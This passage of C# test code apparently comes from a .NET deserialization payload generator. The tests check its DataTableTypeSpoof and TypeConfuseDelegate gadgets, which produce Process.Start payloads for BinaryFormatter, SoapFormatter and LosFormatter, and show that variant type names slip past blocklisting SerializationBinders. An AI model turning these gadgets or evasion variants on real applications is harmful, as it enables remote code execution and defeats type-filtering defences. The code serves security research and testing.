            RunResult v1soap = GenerateWithVariant("DataTableTypeSpoof", "SoapFormatter", 1);
            AssertTrue(v1soap.Success, "variant 1 + SoapFormatter still generates: " + v1soap.ErrorMessage);

            RunResult v2bin = GenerateWithVariant("DataTableTypeSpoof", "BinaryFormatter", 2);
            AssertTrue(v2bin.Success, "variant 2 + BinaryFormatter generates: " + v2bin.ErrorMessage);
        }

        // With no option at all the gadget must produce the exact bytes of an explicit
        // --variant 1, across every advertised formatter and both minify states. Same
        // reasoning as DataTableDefaultEqualsVariantOne: it compares two live generations, so
        // no runtime-sensitive hash is baked in.
        private static void DataTableTypeSpoofDefaultEqualsVariantOne()
        {
            foreach (string formatter in new[] { "BinaryFormatter", "SoapFormatter", "LosFormatter" })
            {
                for (int m = 0; m < 2; m++)
                {
                    bool minify = m == 1;

                    RunResult def = GenerateDataTableTypeSpoof(formatter, minify, null, null, null);
                    RunResult v1 = GenerateDataTableTypeSpoof(formatter, minify, 1, null, null);

                    string desc = "DataTableTypeSpoof -f " + formatter + (minify ? " (minify)" : "");
                    AssertTrue(def.Success, "implicit default generates: " + desc + " -> " + def.ErrorMessage);
                    AssertTrue(v1.Success, "explicit variant 1 generates: " + desc + " -> " + v1.ErrorMessage);

                    byte[] a = def.Raw as byte[];
                    byte[] b = v1.Raw as byte[];
                    AssertTrue(a != null && b != null, "both payloads are byte streams: " + desc);
                    AssertTrue(BytesEqual(a, b),
                        "implicit default equals explicit variant 1 byte-for-byte: " + desc);
                }
            }
        }

        // A regression guard on the UNTOUCHED gadget: adding the spoof must not change what
        // -g DataTable writes. This is what makes "the shipped DataTable bytes did not change"
        // a tested claim instead of a promise.
        private static void DataTableStillEmitsItsOwnTypeName()
        {
            foreach (string formatter in new[] { "BinaryFormatter", "SoapFormatter", "LosFormatter" })
            {
                RunResult r = GenerateDataTable(formatter, false, null);
                AssertTrue(r.Success, "DataTable -f " + formatter + " generates: " + r.ErrorMessage);
                string wire = SearchableWire(r, formatter);

                if (formatter.Equals("SoapFormatter", StringComparison.OrdinalIgnoreCase))
                {
                    AssertTrue(wire.Contains("nsassem/System.Data/"),
                        "DataTable SOAP still names the System.Data namespace");
                    AssertTrue(wire.Contains(":DataTable "),
                        "DataTable SOAP still uses the DataTable element name");
                }
                else
                {
                    AssertTrue(wire.Contains("System.Data.DataTable"),
                        "DataTable -f " + formatter + " still writes its own type name");
                }

                AssertTrue(!wire.Contains("SsdlGenerator"),
                    "DataTable -f " + formatter + " never mentions the spoof default profile");
            }
        }

        // The interactive editor has to offer both new settings, and the assembly default is
        // the exact shape that once turned a comma-carrying VALUE into a menu of broken
        // fragments (EditableField.AttributeLikeParts). Also lock that --bgc stays hidden:
        // this is a root carrier, not a bridge gadget.
        private static void EditorOffersTheSpoofOptionsWithoutABrokenAssemblyMenu()
        {
            var editor = new ModuleEditor(null, null, true, null, null);
            var fields = editor.BuildFieldsForTest("DataTableTypeSpoof");

            EditableField variant = FindEditable(fields, "variant");
            AssertTrue(variant != null && !variant.Hidden, "the editor offers variant");

            // THE VALUE, not just the presence. The first version of this test checked only
            // that the assembly help was not turned into a choice MENU, and passed while the
            // editor was showing (and emitting) "System" for both settings - a payload naming
            // a type that cannot resolve, so nothing fired. A field the editor pre-fills is a
            // value it will emit, so the value is what has to be asserted.
            EditableField targetType = FindEditable(fields, "target-type");
            AssertTrue(targetType != null && !targetType.Hidden, "the editor offers target-type");
            AssertEqual(DataTableTypeSpoofGenerator.DefaultTargetType, targetType.Value,
                "the editor's target-type default is the gadget's own default, whole");

            EditableField targetAssembly = FindEditable(fields, "target-assembly");
            AssertTrue(targetAssembly != null && !targetAssembly.Hidden, "the editor offers target-assembly");
            AssertEqual(DataTableTypeSpoofGenerator.DefaultTargetAssembly, targetAssembly.Value,
                "the editor's target-assembly default is the gadget's own default, whole");
            AssertTrue(targetAssembly.Choices == null || targetAssembly.Choices.Count == 0,
                "the assembly display name in the help is not offered as a choice menu");
            AssertTrue(targetType.Choices == null || targetType.Choices.Count == 0,
                "the two profile names in the help are not offered as a choice menu");

            // End to end: what the editor would emit must build the payload the CLI builds
            // with no options at all.
            foreach (string formatter in new[] { "BinaryFormatter", "SoapFormatter", "LosFormatter" })
            {
                List<string> emitted = editor.GadgetExtraArgvForTest();
                RunResult viaEditor = GenerateWithExtraArgs("DataTableTypeSpoof", formatter, "calc.exe", emitted);
                RunResult plain = GenerateWithExtraArgs("DataTableTypeSpoof", formatter, "calc.exe", new List<string>());
                AssertTrue(viaEditor.Success, "the editor's own arguments generate (-f " + formatter + "): " + viaEditor.ErrorMessage);
                AssertTrue(BytesEqual(viaEditor.Raw as byte[], plain.Raw as byte[]),
                    "the editor's defaults build the same payload as no options (-f " + formatter + ")");
            }

            EditableField bgc = FindEditable(fields, "bridgedgadgetchain");
            AssertTrue(bgc != null && bgc.Hidden, "bgc is hidden for this non-bridge gadget");
        }

        // A binder that rejects ONE name: System.Data.DataTable, exactly the policy the
        // spoof exists to walk past. Everything else falls through to the default binding,
        // so the rest of the graph is untouched.
        private sealed class DataTableNameBlockingBinder : System.Runtime.Serialization.SerializationBinder
        {
            public override Type BindToType(string assemblyName, string typeName)
            {
                if (string.Equals(typeName, "System.Data.DataTable", StringComparison.Ordinal))
                    throw new System.Runtime.Serialization.SerializationException(
                        "blocked by the test binder: " + typeName);
                return null;
            }
        }

        // THE BEHAVIOURAL PROOF OF THE EVASION, which the wire-name assertions cannot give:
        // through a binder that rejects only "System.Data.DataTable", the DataTable gadget is
        // blocked and never runs, while DataTableTypeSpoof passes the same binder and fires.
        // That is the claim the gadget is FOR, stated as a behaviour rather than a byte
        // search.
        private static void DataTableTypeSpoofEvadesADataTableBlockingBinder()
        {
            // The plain carrier must be blocked, and must NOT execute.
            using (FireTarget blocked = FireBackend.Create("DTTS_binder_plain_blocked"))
            {
                byte[] payload = MarkerPayloadFor("DataTable", "BinaryFormatter", blocked, null);
                Exception caught = null;
                try { DeserializeWithBinder(payload, new DataTableNameBlockingBinder()); }
                catch (Exception ex) { caught = ex; }

                AssertTrue(caught != null, "the binder blocks the DataTable root of the plain gadget");
                // An ABSENCE assertion, so it keeps a short bound.
                AssertTrue(!blocked.Wait(300), "the plain DataTable carrier does not execute when its root type is blocked");
            }

            // The spoofed name passes the same binder and fires.
            using (FireTarget fire = FireBackend.Create("DTTS_binder_spoofed"))
            {
                byte[] payload = MarkerPayloadFor("DataTableTypeSpoof", "BinaryFormatter", fire, null);
                // The inner TFRP throws AFTER Process.Start (its ObjectDataProvider is cast to
                // Brush), so the fire evidence, not a clean return, is the proof.
                RunSTA(delegate { DeserializeWithBinder(payload, new DataTableNameBlockingBinder()); });
                AssertTrue(fire.Wait(MarkerWaitMs),
                    "the spoofed subclass name fires through a binder that rejects System.Data.DataTable");
            }
        }

        // A test-owned copy of the technique, carrying a BENIGN string instead of a gadget.
        //
        // Why it has to exist: with TextFormattingRunProperties or TypeConfuseDelegate in the
        // cell, the inner gadget is materialised from the member records and fires - and then
        // throws - BEFORE the root object is ever constructed. So no fire row can show that
        // the subclass's inherited DataTable(SerializationInfo, StreamingContext) constructor
        // rebuilt the table, which is the half of the technique a target that CASTS the root
        // to DataTable depends on. A benign cell removes the throw and lets the round trip
        // finish, which is the only way to see that step.
        //
        // It deliberately does not reach into the gadget's own marshal: what is being proven
        // is the WIRE FORMAT (DataTable's member set under a subclass name), not one class.
        [Serializable]
        private sealed class SubclassNameCarrier : System.Runtime.Serialization.ISerializable
        {
            private readonly System.Data.DataTable _table;
            private readonly string _targetTypeName;
            private readonly string _targetAssemblyName;

            public SubclassNameCarrier(System.Data.DataTable table, string typeName, string assemblyName)
            {
                _table = table;
                _targetTypeName = typeName;
                _targetAssemblyName = assemblyName;
            }

            public void GetObjectData(System.Runtime.Serialization.SerializationInfo info,
                System.Runtime.Serialization.StreamingContext context)
            {
                _table.GetObjectData(info, context);
                info.FullTypeName = _targetTypeName;
                info.AssemblyName = _targetAssemblyName;
            }
        }

        // The other half of the claim: a DataTable member set delivered under an in-box
        // SUBCLASS name really is rebuilt, by that subclass, through the inherited
        // constructor - with the row intact.
        private static void SpoofedSubclassNameRebuildsARealDataTable()
        {
            const string cellValue = "ysonet-subclass-probe";

            foreach (string formatter in new[] { "BinaryFormatter", "SoapFormatter" })
            {
                object rebuilt = RoundTripCarrierUnderName(formatter,
                    DataTableTypeSpoofGenerator.DefaultTargetType,
                    DataTableTypeSpoofGenerator.DefaultTargetAssembly, cellValue);

                AssertTrue(rebuilt != null, formatter + ": the spoofed document deserializes to an object");
                AssertEqual(DataTableTypeSpoofGenerator.DefaultTargetType, rebuilt.GetType().FullName,
                    formatter + ": the target really built the named subclass, not System.Data.DataTable");

                System.Data.DataTable table = rebuilt as System.Data.DataTable;
                AssertTrue(table != null, formatter + ": the rebuilt object IS a DataTable (the inherited constructor ran)");
                AssertEqual(1, table.Rows.Count, formatter + ": the inherited constructor rebuilt the row");
                AssertEqual(cellValue, Convert.ToString(table.Rows[0][0]), formatter + ": the cell value survived the round trip");
            }

            // And the negative that explains the operator table in the gadget header: a name
            // that does not resolve cannot rebuild anything. (A payload carrying a GADGET
            // still fires in that case, because the inner gadget is materialised first -
            // which is exactly why this benign carrier is the honest place to measure it.)
            Exception caught = null;
            try
            {
                RoundTripCarrierUnderName("BinaryFormatter", "System.Data.NoSuchTypeAtAll",
                    DataTableTypeSpoofGenerator.DefaultTargetAssembly, cellValue);
            }
            catch (Exception e) { caught = e; }
            AssertTrue(caught != null, "a type name that does not resolve cannot rebuild the carrier");
        }

        // Serialize the benign carrier under the given type/assembly name and read it back.
        private static object RoundTripCarrierUnderName(string formatter, string typeName,
            string assemblyName, string cellValue)
        {
            System.Data.DataTable table = new System.Data.DataTable("x");
            table.RemotingFormat = System.Data.SerializationFormat.Binary;
            table.Columns.Add("x", typeof(object));
            table.Rows.Add(new object[] { cellValue });
            table.AcceptChanges();

            var carrier = new SubclassNameCarrier(table, typeName, assemblyName);

            if (formatter.Equals("SoapFormatter", StringComparison.OrdinalIgnoreCase))
                return SerializersHelper.SoapFormatter_deserialize(SerializersHelper.SoapFormatter_serialize(carrier));

            var bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
            using (var ms = new MemoryStream())
            {
                bf.Serialize(ms, carrier);
                ms.Position = 0;
                return bf.Deserialize(ms);
            }
        }

        // Build a real payload for one gadget whose command produces the fire target's effect.
        private static byte[] MarkerPayloadFor(string gadget, string formatter, FireTarget fire, List<string> extra)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = fire.Command;
            ia.IsRawCmd = true;
            ia.Test = false;
            ia.ExtraArguments = extra ?? new List<string>();
            RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = gadget,
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            });
            AssertTrue(r.Success, gadget + " -f " + formatter + " generates a marker payload: " + r.ErrorMessage);
            return (byte[])r.Raw;
        }

        // ---- Editor defaults must BE the module's real defaults ------------------
        //
        // WHY THESE EXIST. NDesk.Options records no default (the validation is an opaque
        // compiled lambda), so the interactive editor RECOVERS one from the option's help
        // prose. That value is not decoration: pressing Generate EMITS it. A recovered
        // value that is a truncation of the real default therefore ships a different
        // payload than the command line does, with nothing failing anywhere -
        // `DataTableTypeSpoof` shipped with the editor showing and emitting
        // `--target-type System`, which generates a perfectly well-formed payload naming a
        // type no target can resolve, so it simply never fired. Neither the generation
        // matrix nor the fire rows could see it, because both drive the CLI path.
        //
        // Two checks, deliberately different in kind:
        //   1. a cheap structural one over EVERY gadget and plugin option (below), and
        //   2. a generation-equality one per gadget (further down), which is the one that
        //      actually proves the emitted payload is unchanged.

        // A recovered default has to be a COMPLETE value, not the front half of one. The
        // property is parser-independent on purpose: whatever heuristic recovers the value,
        // the character following it in the help text must end a value. A '.' only ends one
        // when a space or the end of the text follows it, which is what separates the
        // sentence in "Default: AES. e.g: ..." from the dots inside
        // "Default: System.Data.Entity.Design...".
        private static void EditorDefaultsAreCompleteValuesNotTruncations()
        {
            var problems = new List<string>();
            int gadgetDefaults = 0, pluginDefaults = 0;

            // The editor is built per module KIND (its third argument), and a plugin loaded
            // as a gadget silently loads nothing at all - no exception, an empty field list,
            // and an audit that reports success having checked zero plugins. The first
            // version of this test did exactly that, so the two counts below are asserted
            // separately: a half of this audit that stops covering anything has to fail.
            foreach (var module in ModulesForDefaultAudit())
            {
                string name = module.Key;
                bool isGadget = module.Value;

                var editor = new ModuleEditor(null, null, isGadget, null, null);
                List<EditableField> fields;
                try { fields = editor.BuildFieldsForTest(name); }
                catch (Exception e) { problems.Add(name + " could not be loaded in the editor: " + e.Message); continue; }
                if (fields == null || fields.Count == 0)
                {
                    problems.Add(name + " loaded no fields in the editor (wrong module kind?)");
                    continue;
                }

                foreach (EditableField f in fields)
                {
                    if (f == null || f.IsAction || !f.ModuleOwn || f.Label == "variant")
                        continue;
                    string value = f.Value;
                    if (string.IsNullOrEmpty(value) || string.IsNullOrEmpty(f.Help))
                        continue;

                    if (isGadget) gadgetDefaults++; else pluginDefaults++;
                    int at = f.Help.IndexOf(value, StringComparison.Ordinal);
                    if (at < 0)
                    {
                        // A default that is not in the help at all is not necessarily wrong
                        // (a flag's "true"/"" for instance), so this is not a failure; the
                        // truncation check simply has nothing to measure.
                        continue;
                    }
                    int after = at + value.Length;
                    if (after < f.Help.Length && !EndsAValue(f.Help, after))
                    {
                        problems.Add(name + " --" + f.Label + ": the editor default \"" + value
                            + "\" is cut short - the help continues with \""
                            + f.Help.Substring(after, Math.Min(24, f.Help.Length - after))
                            + "\". Quote the default in the option help so it is taken whole.");
                    }
                }
            }

            AssertTrue(gadgetDefaults > 0, "the audit checked gadget defaults (was " + gadgetDefaults + ")");
            AssertTrue(pluginDefaults > 0, "the audit checked plugin defaults (was " + pluginDefaults + ")");
            AssertTrue(problems.Count == 0,
                "every editor default is a complete value (" + gadgetDefaults + " gadget, "
                + pluginDefaults + " plugin):\n  " + string.Join("\n  ", problems.ToArray()));
        }

        // True when the character at `i` ends a value rather than continuing it.
        private static bool EndsAValue(string help, int i)
        {
            char c = help[i];
            if (c == '.')
                return i + 1 >= help.Length || help[i + 1] == ' ';
            return c == ' ' || c == ',' || c == ';' || c == ')' || c == '"' || c == '\''
                || c == '\r' || c == '\n' || c == '/';
        }

        // Every module the editor can load, paired with its KIND (true = gadget). The kind
        // is carried with the name because the editor needs it and getting it wrong loads
        // nothing rather than failing.
        private static List<KeyValuePair<string, bool>> ModulesForDefaultAudit()
        {
            var modules = new List<KeyValuePair<string, bool>>();
            foreach (string g in GadgetRegistry.GetGadgetNames())
            {
                // "Generic" is the base generator, not a real gadget.
                if (g == "Generic") continue;
                modules.Add(new KeyValuePair<string, bool>(g, true));
            }
            foreach (string p in PluginRegistry.GetPluginNames())
                modules.Add(new KeyValuePair<string, bool>(p, false));
            return modules;
        }

        // The deep check: for every gadget, generating with NOTHING typed must produce the
        // same payload as generating with the editor's pre-filled defaults passed
        // explicitly. That is what "default" means, and it is the assertion that would have
        // caught the DataTableTypeSpoof truncation immediately - the two payloads named
        // different types.
        //
        // A gadget whose payload is not reproducible (the *FromFile family compiles an
        // assembly, so every build differs) cannot be compared byte for byte; those are
        // reported by name and still have to agree on success, so the set is visible
        // instead of silently shrinking.
        private static void EveryGadgetEditorDefaultMatchesTheGadgetsOwnDefault()
        {
            string csFixture = WriteTestArtifact("ysonet_editor_default_fixture.cs",
                "public class YsonetTestFixture { public YsonetTestFixture() { } }");
            string dllFixture = new Uri(typeof(OptionSet).Assembly.CodeBase).LocalPath;
            string contentFixture = ContentFixture();

            var problems = new List<string>();
            var notReproducible = new List<string>();
            int compared = 0;

            try
            {
                foreach (string name in GadgetRegistry.GetGadgetNames())
                {
                    if (name == "Generic") continue;
                    // A denial-of-service gadget is never built by an automatic sweep.
                    if (DosPolicy.IsDosGadget(name)) continue;

                    var editor = new ModuleEditor(null, null, true, null, null);
                    editor.BuildFieldsForTest(name);
                    List<string> editorArgs = editor.GadgetExtraArgvForTest();
                    if (editorArgs == null || editorArgs.Count == 0)
                        continue; // the editor pre-fills nothing: nothing to prove here

                    IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
                    string formatter = g.SupportedFormatters()[0].Split(' ')[0];
                    string sample = SampleInputForGadget(g.CommandInput(), csFixture, dllFixture, contentFixture);

                    RunResult plain = GenerateWithExtraArgs(name, formatter, sample, new List<string>());
                    RunResult plainAgain = GenerateWithExtraArgs(name, formatter, sample, new List<string>());
                    RunResult withDefaults = GenerateWithExtraArgs(name, formatter, sample, editorArgs);

                    string cell = name + " -f " + formatter + " (editor emits: " + string.Join(" ", editorArgs.ToArray()) + ")";

                    if (plain.Success != withDefaults.Success)
                    {
                        problems.Add(cell + " -> passing the editor's defaults changed whether it generates ("
                            + plain.Success + " -> " + withDefaults.Success + "): " + withDefaults.ErrorMessage);
                        continue;
                    }
                    if (!plain.Success)
                        continue; // both refused for the same reason; the defaults changed nothing

                    byte[] a = plain.Raw as byte[], b = plainAgain.Raw as byte[], c = withDefaults.Raw as byte[];
                    if (a == null || b == null || c == null)
                    {
                        string sa = Convert.ToString(plain.Raw), sb = Convert.ToString(plainAgain.Raw), sc = Convert.ToString(withDefaults.Raw);
                        if (sa != sb) { notReproducible.Add(name); continue; }
                        compared++;
                        if (sa != sc)
                            problems.Add(cell + " -> the editor's defaults produce a different payload than no options at all");
                        continue;
                    }
                    if (!BytesEqual(a, b)) { notReproducible.Add(name); continue; }
                    compared++;
                    if (!BytesEqual(a, c))
                        problems.Add(cell + " -> the editor's defaults produce a different payload than no options at all");
                }
            }
            finally
            {
                try { File.Delete(csFixture); } catch { }
                try { File.Delete(contentFixture); } catch { }
            }

            if (notReproducible.Count > 0)
                Console.WriteLine("    [info] payload not byte-reproducible, compared on success only ("
                    + notReproducible.Count + "): " + string.Join(", ", notReproducible.ToArray()));

            AssertTrue(compared > 0, "the audit compared real payloads (was " + compared + ")");
            AssertTrue(problems.Count == 0,
                "the editor's defaults build the same payload as no options (" + compared + " compared):\n  "
                + string.Join("\n  ", problems.ToArray()));
        }

        private static RunResult GenerateWithExtraArgs(string gadget, string formatter, string cmd, List<string> extra)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = cmd;
            ia.Test = false;
            ia.ExtraArguments = new List<string>(extra);
            GenerationRequest req = new GenerationRequest
            {
                GadgetName = gadget,
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            };
            return PayloadRunner.GenerateGadget(req);
        }

        // The helper the two checks above rest on, tested directly so its rule is pinned
        // rather than inferred from a gadget's behaviour.
        private static void ParseDefaultKeepsDottedValuesWhole()
        {
            // A dotted type name is ONE value: a period only ends it when a space or the
            // end of the text follows. This is the bug DataTableTypeSpoof shipped with.
            AssertEqual("System.Data.Entity.Design.SsdlGenerator.TableDetailsCollection",
                EditableField.ParseDefault("Must be a DataTable subclass. Default: System.Data.Entity.Design.SsdlGenerator.TableDetailsCollection. Second profile: x"),
                "a dotted default is taken whole and still stops at the sentence end");

            // The same rule for a file name with an extension (ResxPlugin's --of).
            AssertEqual("payload.resources",
                EditableField.ParseDefault("a file path location for CompiledDotResources to store the .resources file (default: payload.resources)"),
                "a dotted file name keeps its extension");

            // A sentence-ending period still ends the value.
            AssertEqual("AES",
                EditableField.ParseDefault("Enter the decryption from the web.config. Default: AES. e.g: AES/DES/3DES"),
                "a period followed by a space still ends the value");

            // A comma always ends an unquoted value, which is why an assembly identity has
            // to be quoted in the help.
            AssertEqual("System.Data.Entity.Design",
                EditableField.ParseDefault("Default: System.Data.Entity.Design, Version=4.0.0.0, Culture=neutral"),
                "an unquoted comma-bearing value is still cut at the comma");
            AssertEqual("System.Data.Entity.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
                EditableField.ParseDefault("Assembly identity. Default: \"System.Data.Entity.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\""),
                "a quoted default is taken whole, commas and all");

            // Unchanged behaviour for the ordinary cases.
            AssertEqual("false", EditableField.ParseDefault("Whether to run payload locally. Default: false"),
                "a plain word default is unchanged");
            AssertEqual("", EditableField.ParseDefault("no default mentioned here"),
                "prose without a 'Default:' marker yields nothing");
        }

        // Generate DataTableTypeSpoof with a never-executed placeholder command. Pass null for
        // any of variant / type / assembly to leave that option off the command line entirely,
        // which is what proves the defaults.
        private static RunResult GenerateDataTableTypeSpoof(string formatter, bool minify, int? variant,
            string targetType, string targetAssembly)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = "calc.exe";
            ia.Test = false;
            ia.Minify = minify;

            var extra = new List<string>();
            if (variant.HasValue) { extra.Add("--variant"); extra.Add(variant.Value.ToString()); }
            if (targetType != null) { extra.Add("--target-type"); extra.Add(targetType); }
            if (targetAssembly != null) { extra.Add("--target-assembly"); extra.Add(targetAssembly); }
            ia.ExtraArguments = extra;

            GenerationRequest req = new GenerationRequest
            {
                GadgetName = "DataTableTypeSpoof",
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            };
            return PayloadRunner.GenerateGadget(req);
        }

        // One searchable form of a payload, per output encoding. BinaryFormatter and
        // SoapFormatter payloads are readable as ASCII directly; LosFormatter output is base64
        // text, so a search for a type name over the raw value silently finds nothing.
        private static string SearchableWire(RunResult r, string formatter)
        {
            string text = r.Raw is byte[]
                ? Encoding.ASCII.GetString((byte[])r.Raw)
                : Convert.ToString(r.Raw);
            if (formatter.Equals("LosFormatter", StringComparison.OrdinalIgnoreCase))
                return Encoding.ASCII.GetString(Convert.FromBase64String(text.Trim()));
            return text;
        }

        // ---- TypeConfuseDelegate root-container variants -----------------------
        //
        // Variants 2 and 3 keep the Comparison<string> -> Process.Start splice and only
        // change the serialized ROOT: SortedDictionary<string,string> (whose serialized
        // TreeSet<KeyValuePair<string,string>> backing set forwards key comparisons through
        // KeyValuePairComparer) and the internal TreeSet<string>. They exist to evade a
        // binder or blocklist that rejects the exact SortedSet wire type name.

        // Generate TypeConfuseDelegate with a never-executed placeholder command. Pass
        // variant=null for the implicit default (no --variant).
        private static RunResult GenerateTcd(string formatter, bool minify, bool useSimpleType, int? variant)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = "calc.exe";
            ia.Test = false;
            ia.Minify = minify;
            ia.UseSimpleType = useSimpleType;
            if (variant.HasValue)
                ia.ExtraArguments = new List<string> { "--variant", variant.Value.ToString() };
            GenerationRequest req = new GenerationRequest
            {
                GadgetName = "TypeConfuseDelegate",
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            };
            return PayloadRunner.GenerateGadget(req);
        }

        private static readonly string[] TcdFormatters =
            { "BinaryFormatter", "NetDataContractSerializer", "LosFormatter" };

        // Adding the container selector must not change the default payload: with no
        // option, TypeConfuseDelegate must produce the exact same bytes as an explicit
        // --variant 1, for every advertised formatter and every minify/usesimpletype
        // combination - including the two hardcoded NRBF paths (--minify --ust with
        // BinaryFormatter and LosFormatter), which stay gated on variant 1. This compares
        // two live generations rather than a frozen hash, so it survives payload evolution.
        private static void TypeConfuseDelegateDefaultEqualsVariantOne()
        {
            foreach (string formatter in TcdFormatters)
            {
                for (int m = 0; m < 2; m++)
                {
                    for (int u = 0; u < 2; u++)
                    {
                        bool minify = m == 1, ust = u == 1;
                        string desc = "TypeConfuseDelegate -f " + formatter
                            + (minify ? " (minify)" : "") + (ust ? " (ust)" : "");

                        RunResult def = GenerateTcd(formatter, minify, ust, null);
                        RunResult v1 = GenerateTcd(formatter, minify, ust, 1);

                        AssertTrue(def.Success, "implicit default generates: " + desc + " -> " + def.ErrorMessage);
                        AssertTrue(v1.Success, "explicit variant 1 generates: " + desc + " -> " + v1.ErrorMessage);

                        byte[] a = def.Raw as byte[];
                        byte[] b = v1.Raw as byte[];
                        AssertTrue(a != null && b != null, "both payloads are byte streams: " + desc);
                        AssertTrue(BytesEqual(a, b),
                            "implicit default equals explicit variant 1 byte-for-byte: " + desc);
                    }
                }
            }

            // The hardcoded minified NRBF path belongs to variant 1 only, so the other two
            // containers must take the normal Serialize() route and produce different bytes.
            foreach (string formatter in new[] { "BinaryFormatter", "LosFormatter" })
            {
                byte[] one = (byte[])GenerateTcd(formatter, true, true, 1).Raw;
                foreach (int v in new[] { 2, 3 })
                {
                    RunResult other = GenerateTcd(formatter, true, true, v);
                    AssertTrue(other.Success, "variant " + v + " generates on the minify+ust " + formatter
                        + " path: " + other.ErrorMessage);
                    AssertTrue(!BytesEqual(one, (byte[])other.Raw),
                        "variant " + v + " does not reuse the hardcoded variant-1 NRBF stream (" + formatter + ")");
                }
            }
        }

        // The variant option must reject anything that is not 1, 2, or 3 instead of quietly
        // falling back to the default, which would hide a typo behind a payload the user did
        // not ask for.
        private static void TypeConfuseDelegateVariantOptionIsValidated()
        {
            foreach (string bad in new[] { "nope", "0", "4", "-1", "" })
            {
                InputArgs ia = new InputArgs();
                ia.Cmd = "calc.exe";
                ia.Test = false;
                ia.ExtraArguments = new List<string> { "--variant", bad };
                RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
                {
                    GadgetName = "TypeConfuseDelegate",
                    FormatterName = "BinaryFormatter",
                    OutputFormat = "",
                    InputArgs = ia,
                });
                AssertTrue(!r.Success, "--variant " + bad + " is rejected");
                AssertTrue((r.ErrorMessage ?? "").IndexOf("variant must be 1, 2, or 3", StringComparison.OrdinalIgnoreCase) >= 0,
                    "--variant " + bad + " reports the allowed values: " + r.ErrorMessage);
            }

            foreach (int good in new[] { 1, 2, 3 })
                AssertTrue(GenerateTcd("BinaryFormatter", false, false, good).Success,
                    "--variant " + good + " is accepted");
        }

        // The point of variants 2 and 3 is the wire type names, so assert them directly on
        // the BinaryFormatter stream: the chosen root must be present and the SortedSet name
        // must be gone. Variant 2 must also carry the inner TreeSet backing set that actually
        // triggers the comparer.
        private static void TypeConfuseDelegateVariantRootsAvoidSortedSetName()
        {
            const string sortedSet = "System.Collections.Generic.SortedSet`1";
            const string treeSet = "System.Collections.Generic.TreeSet`1";
            const string sortedDict = "System.Collections.Generic.SortedDictionary`2";

            string v1 = TcdStreamText(1);
            AssertTrue(v1.Contains(sortedSet), "variant 1 still serializes a SortedSet root");

            string v2 = TcdStreamText(2);
            AssertTrue(v2.Contains(sortedDict), "variant 2 serializes a SortedDictionary root");
            AssertTrue(v2.Contains(treeSet), "variant 2 carries the inner TreeSet backing set");
            AssertTrue(v2.Contains("KeyValuePairComparer"), "variant 2 carries the KeyValuePairComparer that forwards key comparisons");
            AssertTrue(!v2.Contains(sortedSet), "variant 2 emits no SortedSet type record");

            string v3 = TcdStreamText(3);
            AssertTrue(v3.Contains(treeSet), "variant 3 serializes a TreeSet root");
            AssertTrue(!v3.Contains(sortedDict), "variant 3 does not wrap the set in a dictionary");
            AssertTrue(!v3.Contains(sortedSet), "variant 3 emits no SortedSet type record");

            // The delegate primitive is unchanged in all three.
            foreach (var pair in new[] { new[] { "1", v1 }, new[] { "2", v2 }, new[] { "3", v3 } })
            {
                AssertTrue(pair[1].Contains("System.DelegateSerializationHolder"),
                    "variant " + pair[0] + " still carries the delegate serialization holder");
                AssertTrue(pair[1].Contains("System.Diagnostics.Process"),
                    "variant " + pair[0] + " still targets Process.Start");
            }
        }

        // The raw BinaryFormatter bytes of one variant, read as ASCII so the embedded type
        // name records can be searched.
        private static string TcdStreamText(int variant)
        {
            RunResult r = GenerateTcd("BinaryFormatter", false, false, variant);
            AssertTrue(r.Success, "TypeConfuseDelegate variant " + variant + " generates: " + r.ErrorMessage);
            return Encoding.ASCII.GetString((byte[])r.Raw);
        }

        // A deliberately narrow blocklist: it rejects ONLY a type name that starts with the
        // SortedSet wire name and lets everything else resolve normally. That is exactly the
        // policy variants 2 and 3 target. Returning null falls back to the default binding,
        // so the rest of the graph is untouched.
        private sealed class SortedSetNameBlockingBinder : System.Runtime.Serialization.SerializationBinder
        {
            public override Type BindToType(string assemblyName, string typeName)
            {
                if (typeName != null
                    && typeName.StartsWith("System.Collections.Generic.SortedSet`1", StringComparison.Ordinal))
                    throw new System.Runtime.Serialization.SerializationException(
                        "blocked by the test binder: " + typeName);
                return null;
            }
        }

        // The behavioral proof of the evasion, which the byte-name assertions alone cannot
        // give: through a binder that rejects only the exact SortedSet wire name, variant 1
        // is blocked and never runs, while variants 2 and 3 deserialize and fire the command
        // into a test-owned marker file.
        private static void TypeConfuseDelegateVariantsEvadeSortedSetBinder()
        {
            // Variant 1 must be blocked, and must NOT execute.
            using (FireTarget blocked = FireBackend.Create("TCD_binder_v1_blocked"))
            {
                byte[] payload = TcdMarkerPayload(1, "BinaryFormatter", false, false, blocked);
                Exception caught = null;
                try { DeserializeWithBinder(payload, new SortedSetNameBlockingBinder()); }
                catch (Exception ex) { caught = ex; }

                AssertTrue(caught != null, "the binder blocks the SortedSet root of variant 1");
                // An ABSENCE assertion, so it keeps a short bound: waiting the full budget for
                // something that must never happen only slows the suite down.
                AssertTrue(!blocked.Wait(300), "variant 1 does not execute when its root type is blocked");
            }

            // Variants 2 and 3 pass the same binder and fire.
            foreach (int variant in new[] { 2, 3 })
            {
                using (FireTarget fire = FireBackend.Create("TCD_binder_v" + variant))
                {
                    byte[] payload = TcdMarkerPayload(variant, "BinaryFormatter", false, false, fire);
                    // The gadget throws AFTER Process.Start (the confused return value is cast
                    // back to int), so the fire evidence, not a clean return, is the proof.
                    RunSTA(delegate { DeserializeWithBinder(payload, new SortedSetNameBlockingBinder()); });
                    AssertTrue(fire.Wait(MarkerWaitMs),
                        "variant " + variant + " fires through a binder that rejects the SortedSet wire name");
                }
            }
        }

        private static void DeserializeWithBinder(byte[] payload, System.Runtime.Serialization.SerializationBinder binder)
        {
